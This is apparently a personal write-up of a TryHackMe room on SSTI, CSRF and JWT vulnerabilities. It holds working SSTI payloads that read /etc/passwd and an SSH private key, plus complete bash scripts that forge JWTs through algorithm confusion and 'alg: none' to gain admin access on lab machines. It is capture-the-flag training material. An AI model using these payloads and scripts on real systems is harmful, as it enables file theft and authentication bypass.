# Room
https://tryhackme.com/room/zthobscurewebvulns

# Task 1 - Intro
The larger vulnerabilities in web applications are:
* SSTI
* CSRF
* JWT
* XXE

# Task 2 - Methodology
Sections

# Task 3 - SSTI - What is SSTI
SSTI - Server Side Template Injection.  Template engines allow developers to use static HTML pages with dynamic parts such as a username.  Different template engines have different injection payloads.

# Task 4 - SSTI - Manual exploitation of SSTI
Research
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection

Examples
* Use cat to read the /etc/passwd
    ```
    {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
    ```
* Use read to view test's SSH private key
    ```
    {{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}
    ```

# Task 5 - SSTI - Automatic exploitation of SSTI
Tool to detect SSTI
* https://github.com/epinna/tplmap

Examples
* Grab /etc/passwd with a vulnerable parameter
    ```
    tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'
    ```

# Task 6 - SSTI - Challenge
Use SSTI to read /flag
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

# Task 7 - CSRF - What is CSRF
CSRF - Cross Site Request Forgery.  CSRF happens when a user visits a page on one site, but then an action is performed on a different site.

# Task 8 - CSRF - Manual Exploitation of CSRF
Example

# Task 9 - CSRF - Automatic Exploitation
Tool
* xsrfprobe for Python

Install
* pip3 instal xsrfprobe

Use
* xsrfprobe -u url/endpoint
    ```
    xsrfprobe

        XSRFProbe, A Cross Site Request Forgery Audit Toolkit

    usage: xsrfprobe -u <url> <args>

    Required Arguments:
    -u URL, --url URL     Main URL to test

    Optional Arguments:
    -c COOKIE, --cookie COOKIE
                            Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c
                            PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.
    -o OUTPUT, --output OUTPUT
                            Output directory where files to be stored. Default is the output/ folder where all files generated will be stored.
    -d DELAY, --delay DELAY
                            Time delay between requests in seconds. Default is zero.
    -q, --quiet           Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen.
    -H HEADERS, --headers HEADERS
                            Comma separated list of custom headers you'd want to use. For example: ``--headers "Accept=text/php, X-Requested-With=Dumb"``.
    -v, --verbose         Increase the verbosity of the output (e.g., -vv is more than -v).
    -t TIMEOUT, --timeout TIMEOUT
                            HTTP request timeout value in seconds. The entered value may be either in floating point decimal or an integer. Example: ``--timeout
                            10.0``
    -E EXCLUDE, --exclude EXCLUDE
                            Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won't be scanned. For example:
                            `--exclude somepage/, sensitive-dir/, pleasedontscan/`
    --user-agent USER_AGENT
                            Custom user-agent to be used. Only one user-agent can be specified.
    --max-chars MAXCHARS  Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.
    --crawl               Crawl the whole site and simultaneously test all discovered endpoints for CSRF.
    --no-analysis         Skip the Post-Scan Analysis of Tokens which were gathered during requests
    --malicious           Generate a malicious CSRF Form which can be used in real-world exploits.
    --skip-poc            Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.
    --no-verify           Do not verify SSL certificates with requests.
    --display             Print out response headers of requests while making requests.
    --update              Update XSRFProbe to latest version on GitHub via git.
    --random-agent        Use random user-agents for making requests.
    --version             Display the version of XSRFProbe and exit.
    ```

# Task 10 - CSRF - Challenge
Challenge

# Task 11 - JWT - Intro
JWT = JSON Web Token.  A very secure method of authentication if done right.  JWT makeup: header.payload.secret.  The secret is only known to the server.  The JWT is base64 encoded.  If you control the secret you can control the data.

# Task 12 - JWT - Manual JWT Exploitation
Example

# Task 13 - JWT - Automatic JWT Exploitation
Example

# Task 14 - JWT - Challenge
This challenge has you grab the JWT that exists on the front page in text form, as well as a public key that exists at public.pem.  With those items you are to exploit changing the ALG.

* Grab the JWT
    ```
    body=$(curl --silent http://$ip)
    ```
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.UvzEJi_p45YXpHCZjgkN-R_S8rX7bLBzlTYfTnfmoScXNxYlqasUS6uATsmbqwZ1rOUhwR_I1Ow-lgF5j8q29Sw7YQetx-OsdQSMHIEMgsPhdU1EQ6RCSLF--wiK21ArEc6SCx3zOxLlMZV17IXUA2DRr9dR0S6RiQDwwqWMWWr1DrosDyvNoEjss6NCks4zTb9Ybv6oDiJ0AhOXXCNal93TSk3C1Zt1LR6wk50hnDnyDS0KbiTJNR611QLVzKHv_Z1Su9yDFBbGrUfyMOrIjqb1wCAQg6nuGYEkQi54zjm2A1eVVG8oO5owfZqip-MPbC8EUDff30Y9BftO-uU42w
    ```
* Extract the JWT from the body of the response
    ```
    jwt_body=$(echo $body | grep -o -P '(?<=JWT:\s).*(?=\s</xmp)')
    ```
* Extract the header from the JWT
    ```
    header=$(echo $jwt_body | cut -d"." -f1)
    ```
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9
    ```
* Extract the payload from the JWT
    ```
    payload=$(echo $jwt_body | cut -d"." -f2)
    ```
    ```
    eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ
    ```
* Grab the public key
    ```
    key="$(curl --silent http://$ip/public.pem -O public.pem)"
    ```
* Decode the header
    ```
    decoded_header=$(echo $header | base64 -d)
    ```
* Replace RS256 with HS256
    ```
    new_header=$(echo $decoded_header | sed 's/RS/HS/g')
    ```
    ```
    {"typ":"JWT","alg":"HS256"}
    ```
* Re-encode the header
    ```
    new_encoded_header=$(echo -n $new_header | base64)
    ```
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
    ```
* Join the new header and payload
    ```
    header_payload=$new_encoded_header.$payload
    ```
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ
    ```
* Create an HMAC using the public key against the new header and payload
    ```
    hmac=$(echo -n $header_payload | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n") | cut -d" " -f2)
    ```
    ```
    ac5cb767890bce8639795b961363c65b06ef0b562687b83e503a0990567b66f1
    ```
* Create a new secret
    ```
    secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac')).replace('=','')\")")
    ```
* Create a new JWT using the newly encoded header, original payload, and the new secret derived from the HMAC
    ```
    new_jwt=$new_encoded_header.$payload.$secret
    ```
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjEyNjQ4Mzk2LCJleHAiOjE2MTI2NDg1MTYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.rFy3Z4kLzoY5eVuWE2PGWwbvC1Ymh7g-UDoJkFZ7ZvE
    ```
* Post the new JWT back to the application and receive the flag
    ```
    curl --silent -d "jwt=$new_jwt" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://$ip
    ```

Complete Bash script to grab the flag, just change the IP variable and you are good
```
ip="10.10.57.132"; body=$(curl --silent http://$ip); jwt_body=$(echo $body | grep -o -P '(?<=JWT:\s).*(?=\s</xmp)'); echo; echo "OLD JWT"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); key="$(curl --silent http://$ip/public.pem -O public.pem)"; echo; echo "OLD HEADER"; echo $header; echo; decoded_header=$(echo $header | base64 -d); new_header=$(echo $decoded_header | sed 's/RS/HS/g'); echo "NEW ALG HEADER"; echo $new_header; echo; new_encoded_header=$(echo -n $new_header | base64); echo "NEW ALG HEADER ENCODED"; echo $new_encoded_header; echo; header_payload=$new_encoded_header.$payload; echo "NEW ALG HEADER + PAYLOAD"; echo $header_payload; echo; hmac=$(echo -n $header_payload | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n") | cut -d" " -f2); echo "NEW HMAC"; echo $hmac; secret=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$hmac')).replace('=','')\")"); new_jwt=$new_encoded_header.$payload.$secret; echo; echo "NEW JWT"; echo $new_jwt; echo; echo "POSTING JWT"; curl --silent -d "jwt=$new_jwt" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://$ip
```

# Task 15 - JWT 2 - Intro
Exploiting None in JWT

# Task 16 - JWT 2 - Manual Exploitation
Change header ALG to None, change role to admin, re-encode, drop secret, abuse

JWT debugger
* https://jwt.io/

# Task 17 - JWT 2 - Automatic Exploitation
JWT Tool
* https://github.com/ticarpi/jwt_tool

# Task 18 - JWT 2 - Challenge
This challenge is similar to the last one except you are given an initial user to login as with a non-admin role.  Once logged in a JWT is generated and you are off to attempting admin access.

* Authenticate using the provided credentials in the web app and save a cookie
    ```
     curl -d "username=[removed]&password=[removed]" -X POST --silent http://$ip/auth -c jwt_none
    ```
* Migrate to the authenticated site (/private) using your initial token
    ```
    curl -b jwt_none --silent http://$ip/private | grep -o -P '(?<=h1>\s).*(?=\s</h1)'
    ```
* Grab the JWT from the cookie
    ```
    jwt_body=$(cat jwt_none | grep -o -P '(?<=token\s).*')
    ```
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjEyNjY4MjM5NjI0LCJhZ2VudCI6ImN1cmwvNy43Mi4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MTI2NjgyNDB9.sD9DyMSiWqzg_9Cw3CKpq1RthU9Ft1GA9zgWw-9_DLg
    ```
* Separate header and payload
    ```
    header=$(echo $jwt_body | cut -d"." -f1)
    payload=$(echo $jwt_body | cut -d"." -f2)
    ```
* Decode header
    ```
    decoded_header=$(echo $header | base64 -d)
    ```
* Change ALG to none
    ```
    change_header=$(echo $decoded_header | sed 's/HS256/none/g')
    ```
* Decode payload
    ```
    decoded_payload=$(echo $payload | base64 -d)
    ```
* Change role from user to admin
    ```
    change_payload=$(echo $decoded_payload | sed 's/"user"/"admin"/g')
    ```
* Encode header and payload, remove padding
    ```
    new_header=$(echo $change_header | base64 -w 0 | tr -d "=")
    new_payload=$(echo $change_payload | base64 -w 0 | tr -d "=")
    ```
* Create a new JWT without a secret, don't forget trailing period
    ```
    new_jwt=$new_header.$new_payload.
    ```
* Copy user cookie to an admin cookie placeholder
    ```
    cp jwt_none jwt_admin
    ```
* Setup pattern to search for the JWT in the cookie
    ```
    pattern=$(cat jwt_none | grep -o -P '(?<=token\s).*')
    ```
* Replace the user JWT with the admin JWT in the cookie
    ```
    sed -i "s/$pattern/$new_jwt/g" jwt_admin
    ```
* Refresh your page using the admin cookie/JWT and grab the flag
    ```
    curl -b jwt_admin --silent http://$ip/private | grep "text-center"
    ```
Complete Bash script to grab the flag, just change the IP variable and you are good
```
ip="10.10.150.255"; echo "LOGIN AS NORMAL USER"; curl -d "username=[removed]&password=[removed]" -X POST --silent http://$ip/auth -c jwt_none; curl -b jwt_none --silent http://$ip/private | grep -o -P '(?<=h1>\s).*(?=\s</h1)'; echo; echo "CHANGING ROLE TO ADMIN"; jwt_body=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "JWT BODY FROM COOKIE"; echo $jwt_body; header=$(echo $jwt_body | cut -d"." -f1); payload=$(echo $jwt_body | cut -d"." -f2); echo; echo "OLD HEADER"; echo $header; echo; echo "OLD PAYLOAD"; echo $payload; decoded_header=$(echo $header | base64 -d); echo; echo "OLD DECODED HEADER"; echo $decoded_header; echo; echo "CHANGE ALG TO NONE"; change_header=$(echo $decoded_header | sed 's/HS256/none/g'); echo $change_header; echo; echo "OLD DECODED PAYLOAD"; decoded_payload=$(echo $payload | base64 -d); echo $decoded_payload; echo; echo "CHANGE ROLE TO ADMIN"; change_payload=$(echo $decoded_payload | sed 's/"user"/"admin"/g'); echo $change_payload; echo; echo "ENCODE NEW HEADER AND NEW PAYLOAD"; new_header=$(echo $change_header | base64 -w 0 | tr -d "="); new_payload=$(echo $change_payload | base64 -w 0 | tr -d "="); echo $new_header; echo $new_payload; echo; echo "NEW JWT WITHOUT SECRET"; new_jwt=$new_header.$new_payload.; echo $new_jwt; echo; echo "CREATE NEW COOKIE AND STORE NEW ADMIN JWT"; cp jwt_none jwt_admin; ls -lrta jwt_admin; pattern=$(cat jwt_none | grep -o -P '(?<=token\s).*'); echo; echo "SEARCHING FOR"; echo $pattern; echo; echo -n "UPDATING COOKIE"; sed -i "s/$pattern/$new_jwt/g" jwt_admin; echo; cat jwt_admin; echo; echo "TESTING ADMIN LOGIN"; curl -b jwt_admin --silent http://$ip/private | grep "text-center"
```